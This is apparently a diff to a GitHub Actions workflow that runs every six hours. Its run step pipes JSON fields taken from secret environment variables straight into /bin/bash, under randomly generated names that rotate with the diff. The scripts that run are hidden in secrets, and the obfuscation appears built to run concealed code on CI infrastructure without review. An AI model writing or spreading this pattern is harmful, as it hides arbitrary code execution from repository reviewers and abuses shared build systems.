@@ -2,7 +2,7 @@ name: zhengzadak
 on:
   workflow_dispatch:
   schedule:
-    - cron: '33 4/6 * * *'
+    - cron: '31 1/6 * * *'
 
 jobs:
   build:
@@ -12,22 +12,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: zhengzadak
         env:
-          x05: ${{ secrets.x05 }}
+          gtfog81020: ${{ secrets.gtfog81020 }}
         run: |
-          echo $x05 | jq -r .td8451 | /bin/bash
-          echo $e820 | jq -r .x0540 | /bin/bash
-          echo $iln719 | jq -r .kpzlf2 | /bin/bash
-          echo $pkv44 | jq -r .ou59 | /bin/bash
-          echo $ifdro6007 | jq -r .eys51195 | /bin/bash
-          echo $tk12 | jq -r .x25212 | /bin/bash
-          echo $m6 | jq -r .fqbh2549 | /bin/bash
-          echo $qfjgz4 | jq -r .swqeo0614 | /bin/bash
-          echo $rx178 | jq -r .fru83906 | /bin/bash
-          echo $qlq56834 | jq -r .zb9854 | /bin/bash
-          echo $eyrk24 | jq -r .oxejq39975 | /bin/bash
-          echo $xkj064 | jq -r .l37 | /bin/bash
-          echo $tovxg8 | jq -r .pnt8 | /bin/bash
-          echo $a701 | jq -r .q51 | /bin/bash
-          echo $u82 | jq -r .gzov334 | /bin/bash
-          echo $wh1391 | jq -r .weut4465 | /bin/bash
+          echo $gtfog81020 | jq -r .aei1483 | /bin/bash
+          echo $zox6 | jq -r .qoqnp8 | /bin/bash
+          echo $iubl20172 | jq -r .br52 | /bin/bash
+          echo $j3408 | jq -r .o2 | /bin/bash
+          echo $jodn29137 | jq -r .se39 | /bin/bash
+          echo $fpk649 | jq -r .ac667 | /bin/bash
+          echo $fdwkp9774 | jq -r .fvzv5667 | /bin/bash
+          echo $y52568 | jq -r .nluli85085 | /bin/bash
+          echo $id26 | jq -r .of78413 | /bin/bash
 
